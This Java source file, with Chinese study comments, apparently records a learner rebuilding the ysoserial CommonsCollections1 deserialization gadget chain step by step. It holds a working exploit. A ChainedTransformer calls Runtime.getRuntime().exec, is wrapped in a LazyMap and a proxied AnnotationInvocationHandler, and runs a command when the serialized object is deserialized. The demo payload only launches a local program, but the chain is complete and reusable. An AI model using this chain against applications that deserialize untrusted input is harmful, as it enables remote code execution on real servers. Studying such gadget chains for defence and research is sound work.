package com.example.apache_collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.TransformedPredicate;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.relation.RoleUnresolved;
import javax.print.attribute.standard.RequestingUserName;
import java.io.*;
import java.lang.invoke.MethodHandle;
import java.lang.reflect.*;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class collect {

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException {
        /*
        * 严格来说， collections的利用并不是反序列化的问题，而是反射的问题，在
        * collections中，存在着类  InvokerTransformer，该类有函数：invokerTransformer
        * 通过这个类继续了 Transformer 类， 构造函数 invokerTransformer（methodName, paraType, args）
        * 可以返回一个transfer的类，
        * 如下，可以由下边的案例来构造出一个exec命令执行的transform,
        * 但是这个类需要我们调用 getRuntime() 才可以 获取runtime类的实例; 所以需要再来一次,但是这次不同的是，
        * getRuntime() 是一个静态方法，其中Runtime无法实例化，那么怎么办？ 反射它， 通过 getMethod来调用
        * 一旦获得了getRuntime()这一函数，就可以和上边的结合起来了
        *
        * 但是看ysoserial的利用代码，其实这一部分中的 method.invoke() 其实yso也是用的transfer
        * Object obj2  = trans3.transform(method.invoke(null));
        *
        * 同样的，我们利用InvokeTransformer也可以将其反射出来, 同时将method.invoke变成 run.class
        * 再接下来就是如何将这两个联合起来
        * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/package-summary.html
        *
        * 根据参考和ysoserial，可以看到是用了ChainedTransformer, 可以看一下他的源码
        * https://github.com/apache/commons-collections/blob/master/src/main/java/org/apache/commons/collections4/functors/ChainedTransformer.java
        * https://github.com/apache/commons-collections/blob/collections-3.1/src/java/org/apache/commons/collections/map/TransformedMap.java
        *     @Override
                public T transform(T object) {
                    for (final Transformer<? super T, ? extends T> iTransformer : iTransformers) {
                        object = iTransformer.transform(object);
                    }
                    return object;
                }
        *  可以看到， 在transform的时候， 会依次调用传入的几个transorm类，所以现在要做的就是把这几个拼进去。
        *  首先测试一下，如果不做类型转换，是否可以成功执行；
        *  经过测试 ， 是可以的；
        *
        *
        * 在利用这个时，需要 执行 transform函数， 同样根据参考文档，我们得知可以利用 TransformedMap来实现，看一下源码：
        * 先看构造函数： 传递参数为一个map对象，两个 transformer对象, 这个是新版本的，
        *     public static <K, V> TransformedMap<K, V> transformingMap(final Map<K, V> map,
                        final Transformer<? super K, ? extends K> keyTransformer,
                        final Transformer<? super V, ? extends V> valueTransformer) {
                    return new TransformedMap<>(map, keyTransformer, valueTransformer);
                }
        * 在3.1版本中， 没有公开的public 构造函数，而是一个decorate函数
        *     public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
                    return new TransformedMap(map, keyTransformer, valueTransformer);
                }
        *
        *  同时重写了 readObject, 和 writeObject函数， 由前边的反序列化可知，会优先调用重写的readObject()
        *
        *     private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException {
                    in.defaultReadObject();
                    map = (Map<K, V>) in.readObject(); // (1)
                }
        *
        * 而     protected Object transformValue(Object object) {
                    if (valueTransformer == null) {
                        return object;
                    }
                    return valueTransformer.transform(object);
                }
        * 调用 了transform（）函数， 接着看到 pub函数调用了 transformValue函数
        *     public Object put(Object key, Object value) {
                key = transformKey(key);
                value = transformValue(value);
                return getMap().put(key, value);
            }
        *
        * 所以整个就是 map.put("key", Runtime.class)
        *
        * 但是这里有一个问题， 一般来说， map.setValue 不会设置一个class类，而是设置一个值，
        * 所以在这里，需要把ChainedTransform的中，先传入一个Runtime。class, 不找到，直接看yso的源码
        * new ConstantTransformer(Runtime.class),
        *
        * 看文档， Transformer implementation that returns the same constant each time.
        * https://github.com/apache/commons-collections/blob/collections-3.1/src/java/org/apache/commons/collections/functors/ConstantTransformer.java
        * 是返回一个常量
        *    public ConstantTransformer(Object constantToReturn) {
                super();
                iConstant = constantToReturn;
            }
        *
        *
        *     public Object transform(Object input) {
                    return iConstant;
                }
        * 但是直接调 readObject(writeObject(obj))并没有执行成功，抛出了 TransformedMap cannot be cast to java.util.Hashmap，
        * 当然这里强制转换是可以 的，
        *         Object obj5 = do_unserialize(data);
                  Map aaa = (TransformedMap)obj5;
                  aaa.put("key", "value");
        *
        * 但是不一定能满足这样的条件，想要的是 readObject(bype[]) 直接就可以执行，还是反回来看ysoseria的 CommonCollections的源码
        * 发现了AnnotationInvocationHandler 类。
        * 该类的readObject() 方法，调用 了map.setValue 这个函数， 而其值为memberValues,
        * memberValues 是通过
        * AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues
        * 构造函数来生成的。 所以这里可以先调用一个AnnotationInvocationHandler
        *
        * 该类不可直接声明， 因为是一个private的类， 仅可以从内部访问， 不慌， 我们有反射
        * 首先通过 Class sun_class = Class.forName(sun); 获取到类名，因为我们要获取到构造函数，根据反射获取构造函数为
        *  Constructor getDeclaredConstructor(Class[] params);
        * 然后设置为可访问  setAccessible(true), 以该对象做反序列化即可
        *
        * 至此， ysoseria 第一篇结束
        *
        *
        *
        *  */
        System.out.println(Runtime.class.getName());
        Class[] clss = new Class[]{String.class};

//        Transformer trans = new InvokerTransformer("exec", clss, new String[]{"FBReader"});
//        trans.transform(Runtime.getRuntime());

        /* 做了类型转换
        Transformer trans2 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", null});

        Object obj = trans2.transform(Runtime.class);
        Method method = (Method)obj;
        System.out.println(method.getName());

        InvokerTransformer trans4 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                    new Object[]{null, null});
        Runtime run = (Runtime)trans4.transform(method) ;

        Transformer trans3 = new InvokerTransformer("exec", clss, new String[]{"mousepad"});
//        Object obj2  = trans3.transform(method.invoke(null));
        Object obj2  = trans3.transform(run);
        System.out.println("obj2.");

         */
        // 不做类型转换
        /*
        Transformer trans2 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", null});

        Object obj = trans2.transform(Runtime.class);

        InvokerTransformer trans4 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                new Object[]{null, null});
        Object obj2 = trans4.transform(obj) ;

        Transformer trans3 = new InvokerTransformer("exec", clss, new String[]{"mousepad"});
//        Object obj2  = trans3.transform(method.invoke(null));
        Object obj3  = trans3.transform(obj2);
        System.out.println("obj2.");

         */

        //使用chainedTransformer来执行
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                //最后再加
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec", clss, new String[]{"FBReader"}),
        });

        //直接执行
//        Object obj4 = chainedTransformer.transform(Runtime.class);

        Map map_a = new HashMap();
        Map lazy_map = LazyMap.decorate(map_a, chainedTransformer);
//        map_a = TransformedMap.decorate(map_a, null, chainedTransformer);
//        map_a.put("key", Runtime.class);
//        map_a.put("key", "value");
//        map_a.get("key2");

        String sun = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class sun_class = Class.forName(sun);
        // 仅有一个构造函数
        System.out.println(sun_class.getDeclaredConstructors().length);
        Constructor ctr = sun_class.getDeclaredConstructor(Class.class, Map.class);
        ctr.setAccessible(true); //设置为访问
        InvocationHandler ctr_obj = (InvocationHandler)ctr.newInstance(Override.class, lazy_map);
        Map proxy_ctr_obj = Map.class.cast(Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class},  ctr_obj));

        InvocationHandler ctr_obj2 = (InvocationHandler)ctr.newInstance(Override.class, proxy_ctr_obj);

//
        byte[] data = do_serialize(ctr_obj2);

        System.out.println("do serialized..");

        Object obj5 = do_unserialize(data);
//        Map aaaa =(LazyMap)obj5;
//                aaaa.get("noexists");

//        aaa.put("key", "value");
        // Runtime().getRuntime().exec(
        /*
        Runtime run = Runtime.getRuntime();
        Class cls = run.getClass();

        System.out.println(cls.getName());
        System.out.println(Runtime.class.getName());
        Method[] methods = cls.getMethods();
        for (int i=0; i<methods.length; ++i){
            System.out.println(methods[i].getName());
        }

        Method method = cls.getMethod("exec", String.class);
        try {
            method.invoke(run, "mousepad");
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
        */
    }


    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
